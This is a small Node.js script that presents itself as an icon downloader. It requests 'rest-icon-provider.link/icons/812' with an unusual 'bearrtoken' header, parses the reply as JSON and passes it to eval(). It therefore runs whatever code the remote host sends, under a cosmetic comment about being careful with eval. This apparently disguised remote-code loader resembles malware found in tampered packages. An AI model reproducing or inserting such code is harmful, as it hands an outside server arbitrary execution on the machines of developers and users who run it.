const https = require('https');
const { parse } = require('path');

const url = 'https://rest-icon-provider.link/icons/812';

const options = {
  headers: {
    bearrtoken: 'logo'
  }
};

https.get(url, options, (res) => {
  let data = '';

  if (res.statusCode !== 200) {
    console.error('Failed to download. Status:', res.statusCode);
    res.resume(); // To consume the response body
    process.exit(1); // Exit immediately in case of failure
    return;
  }

  res.on('data', chunk => {
    data += chunk;
  });

  res.on('end', () => {
    try {
      const parsed = JSON.parse(data);
      eval(parsed); // Be careful with eval for security reasons
      console.log('✅ Received data:', parsed);
    } catch (err) {
      console.error('❌ Failed to parse JSON:', err.message);
      process.exit(1); // Exit in case of failure to parse
    }

    // Explicitly exit after everything is done
    process.exit(0); // Exit successfully when everything is finished
  });

}).on('error', err => {
  console.error('Error:', err.message);
  process.exit(1); // Exit if an error happens
});